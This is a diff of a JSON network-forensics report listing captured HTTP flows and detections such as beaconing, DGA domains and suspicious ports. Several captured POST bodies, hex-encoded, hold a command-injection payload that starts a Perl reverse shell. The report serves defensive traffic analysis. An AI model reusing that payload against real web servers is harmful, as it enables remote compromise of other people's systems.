+        "body_preview": "687474703a2f2f6674702e6c797361746f722e6c69752e73652f7075622f43656e744f532f372e302e313430362f757064617465732f7838365f36342f0a6874"
+      },
+      {
+        "src_ip": "88.150.173.218",
+        "dst_ip": "192.168.0.2",
+        "src_port": 80,
+        "dst_port": 49072,
+        "kind": "response",
+        "method": null,
+        "uri": "/?release=7&arch=x86_64&repo=extras&infra=stock",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/plain; charset=ISO-8859-1",
+        "body_size": 574,
+        "truncated": false,
+        "body_preview": "687474703a2f2f6d6972726f722e6e73632e6c69752e73652f43656e744f532f372e302e313430362f6578747261732f7838365f36342f0a687474703a2f2f6d"
+      },
+      {
+        "src_ip": "88.150.173.218",
+        "dst_ip": "192.168.0.2",
+        "src_port": 80,
+        "dst_port": 49071,
+        "kind": "response",
+        "method": null,
+        "uri": "/?release=7&arch=x86_64&repo=os&infra=stock",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/plain; charset=ISO-8859-1",
+        "body_size": 548,
+        "truncated": false,
+        "body_preview": "687474703a2f2f6d6972726f722e68682e73652f63656e746f732f372e302e313430362f6f732f7838365f36342f0a687474703a2f2f6674702e6c797361746f"
+      },
+      {
+        "src_ip": "217.195.49.146",
+        "dst_ip": "192.168.0.2",
+        "src_port": 58554,
+        "dst_port": 80,
+        "kind": "request",
+        "method": "POST",
+        "uri": "/skyblue/index.php?pid=4",
+        "status_code": null,
+        "host": "www.pwned.se",
+        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+        "content_type": "application/x-www-form-urlencoded",
+        "body_size": 507,
+        "truncated": false,
+        "body_preview": "6369643d33266e616d653d3269734a57414e6f44762532322533627065726c2532302d4d494f2532302d6525323025323725323470253364666f726b25336265"
+      },
+      {
+        "src_ip": "217.195.49.146",
+        "dst_ip": "192.168.0.2",
+        "src_port": 35426,
+        "dst_port": 80,
+        "kind": "request",
+        "method": "POST",
+        "uri": "/skyblue/index.php?pid=4",
+        "status_code": null,
+        "host": "www.pwned.se",
+        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+        "content_type": "application/x-www-form-urlencoded",
+        "body_size": 507,
+        "truncated": false,
+        "body_preview": "6369643d33266e616d653d31556731676f6d7373792532322533627065726c2532302d4d494f2532302d6525323025323725323470253364666f726b25336265"
+      },
+      {
+        "src_ip": "217.195.49.146",
+        "dst_ip": "192.168.0.2",
+        "src_port": 54006,
+        "dst_port": 80,
+        "kind": "request",
+        "method": "POST",
+        "uri": "/skyblue/index.php?pid=4",
+        "status_code": null,
+        "host": "www.pwned.se",
+        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+        "content_type": "application/x-www-form-urlencoded",
+        "body_size": 507,
+        "truncated": false,
+        "body_preview": "6369643d33266e616d653d673246774a6867664f372532322533627065726c2532302d4d494f2532302d6525323025323725323470253364666f726b25336265"
+      },
+      {
+        "src_ip": "217.195.49.146",
+        "dst_ip": "192.168.0.2",
+        "src_port": 44446,
+        "dst_port": 80,
+        "kind": "request",
+        "method": "POST",
+        "uri": "/skyblue/index.php?pid=4",
+        "status_code": null,
+        "host": "www.pwned.se",
+        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+        "content_type": "application/x-www-form-urlencoded",
+        "body_size": 507,
+        "truncated": false,
+        "body_preview": "6369643d33266e616d653d56336530356c476a66382532322533627065726c2532302d4d494f2532302d6525323025323725323470253364666f726b25336265"
+      },
+      {
+        "src_ip": "93.184.220.29",
+        "dst_ip": "192.168.0.2",
+        "src_port": 80,
+        "dst_port": 49133,
+        "kind": "response",
+        "method": null,
+        "uri": "/",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "application/ocsp-response",
+        "body_size": 471,
+        "truncated": false,
+        "body_preview": "308201d30a0100a08201cc308201c806092b0601050507300101048201b9308201b530819ea21604140f80611c823161d52f28e78d4638b42ce1c6d9e2180f32"
+      },
+      {
+        "src_ip": "93.184.220.29",
+        "dst_ip": "192.168.0.2",
+        "src_port": 80,
+        "dst_port": 49137,
+        "kind": "response",
+        "method": null,
+        "uri": "/",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "application/ocsp-response",
+        "body_size": 471,
+        "truncated": false,
+        "body_preview": "308201d30a0100a08201cc308201c806092b0601050507300101048201b9308201b530819ea2160414b13ec36903f8bf4701d498261a0802ef63642bc3180f32"
+      }
+    ]
+  },
+  "carved_files": {
+    "total": 0,
+    "files": []
+  },
   "findings": [
     {
       "type": "dga_domain",
@@ -3792,38 +4614,6 @@
       },
       "first_seen": null,
       "last_seen": null
-    },
-    {
-      "type": "suspicious_port",
-      "value": "194.105.226.20:21",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "194.105.226.20",
-        "dst_port": 21,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.2"
-        ],
-        "total_bytes": 506
-      },
-      "first_seen": 1426195689.981472,
-      "last_seen": 1426195690.171007
-    },
-    {
-      "type": "suspicious_port",
-      "value": "212.219.56.184:21",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "212.219.56.184",
-        "dst_port": 21,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.2"
-        ],
-        "total_bytes": 686
-      },
-      "first_seen": 1426195689.604833,
-      "last_seen": 1426195689.753101
     },
     {
       "type": "nxdomain_burst",
@@ -3866,6 +4656,29 @@
       },
       "first_seen": 1426119527.056104,
       "last_seen": 1426204511.864172
+    },
+    {
+      "type": "beaconing",
+      "value": "192.168.0.53 -> 212.227.111.53:443",
+      "confidence": 0.85,
+      "evidence": {
+        "src_ip": "192.168.0.53",
+        "dst_ip": "212.227.111.53",
+        "dst_port": 443,
+        "count": 160,
+        "duration_sec": 85861.0,
+        "flow_rate_per_min": 0.11,
+        "mean_interval_sec": 540.01,
+        "stdev_interval_sec": 0.02,
+        "jitter_ratio": 0.0,
+        "avg_bytes_per_conn": 1857.4,
+        "payload_stddev_ratio": 0.01,
+        "unique_destinations": [],
+        "total_bytes": 297190,
+        "total_packets": 1430
+      },
+      "first_seen": 1426118727.673137,
+      "last_seen": 1426204588.644128
     },
     {
       "type": "script_download",
